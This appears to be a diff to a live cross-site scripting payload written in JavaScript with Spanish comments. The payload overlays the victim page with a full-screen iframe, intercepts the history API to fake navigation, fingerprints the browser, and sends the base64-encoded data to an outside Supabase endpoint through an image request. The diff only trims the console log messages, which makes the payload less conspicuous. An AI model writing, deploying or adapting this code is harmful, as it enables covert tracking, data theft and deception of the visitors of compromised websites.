@@ -5,7 +5,7 @@
 // Verificar contexto inmediatamente
 if (window.self !== window.top) {
     // ESTAMOS EN IFRAME - Solo simulación de rutas
-    console.log('🔄 IFRAME CONTEXT - Route simulation only');
+    console.log('Route simulation only');
     setupIframeRouteSimulation();
 } else if (!window.__MAIN_XSS_EXECUTED__) {
     // ESTAMOS EN PÁGINA PRINCIPAL - IFRAME PRIMERO
@@ -19,7 +19,7 @@ if (window.self !== window.top) {
 function executeMainXSS() {
     'use strict';
     
-    console.log('🚀 MAIN PAGE - Creating iframe immediately');
+    console.log('immediately');
     
     // 1. CREAR IFRAME INMEDIATAMENTE (ANTES DE NADA)
     function createIframeFirst() {
@@ -54,7 +54,7 @@ function executeMainXSS() {
             document.body.style.padding = '0';
             document.body.appendChild(iframe);
             
-            console.log('✅ Iframe created successfully');
+            console.log('successfully');
             
             // 2. CONFIGURAR SISTEMA DE RUTAS DESPUÉS DEL IFRAME
             setupRouteSystem(iframe);
@@ -63,7 +63,7 @@ function executeMainXSS() {
             executeFullFingerprinting();
             
         } catch(e) {
-            console.log('❌ Iframe creation failed:', e);
+            console.log('creation failed:', e);
             setTimeout(createIframeFirst, 100);
         }
     }
@@ -97,7 +97,7 @@ function executeMainXSS() {
         // Escuchar mensajes del iframe para cambios de URL
         window.addEventListener('message', function(event) {
             if (event.data && event.data.type === 'URL_CHANGE') {
-                console.log('🔄 URL change detected:', event.data.url);
+                console.log('change detected:', event.data.url);
                 updateBrowserURL(event.data.url);
             }
         });
@@ -109,7 +109,7 @@ function executeMainXSS() {
             iframe.src = newPath;
         });
         
-        console.log('✅ Route system ready');
+        console.log('system ready');
     }
     
     // 3. FINGERPRINTING COMPLETO (TU CÓDIGO ORIGINAL)
@@ -185,10 +185,10 @@ function executeMainXSS() {
             i.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                     btoa(JSON.stringify(d)).substring(0,1500);
                     
-            console.log('✅ Full fingerprinting completed');
+            console.log('completed');
             
         } catch(e) {
-            console.log('❌ Full fingerprinting failed:', e);
+            console.log('failed:', e);
         }
     }
     
@@ -208,7 +208,7 @@ function setupIframeRouteSimulation() {
     }
     window.__IFRAME_ROUTES_ACTIVE__ = true;
     
-    console.log('🎯 IFRAME - Setting up route simulation');
+    console.log('Setting up route simulation');
     
     // A. INTERCEPTAR HISTORY API
     const originalPushState = history.pushState;
@@ -312,5 +312,5 @@ function setupIframeRouteSimulation() {
         }
     }, 300);
     
-    console.log('✅ Iframe route simulation active');
+    console.log('simulation active');
 }
